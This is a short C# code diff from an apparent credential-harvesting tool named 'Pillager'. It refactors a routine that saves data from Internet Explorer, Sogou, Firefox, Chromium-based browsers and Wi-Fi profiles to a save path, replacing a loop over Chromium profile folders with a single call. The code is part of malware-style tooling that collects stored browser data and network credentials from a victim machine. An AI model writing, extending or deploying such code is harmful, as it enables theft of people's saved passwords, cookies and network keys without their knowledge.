@@ -30,14 +30,8 @@ namespace Pillager
             //Browsers
             IE.Save(savepath);
             OldSogou.Save(savepath);//SogouExplorer < 12.x
-            FireFox.Save(savepath);           
-            foreach (var browser in Chrome.browserOnChromium)
-            {
-                string chromepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-                browser.Value);
-                Chrome chrome = new Chrome(browser.Key, chromepath);
-                chrome.Save(savepath);                
-            }
+            FireFox.Save(savepath);
+            Chrome.Save(savepath);
 
             //Others
             Wifi.Save(savepath);
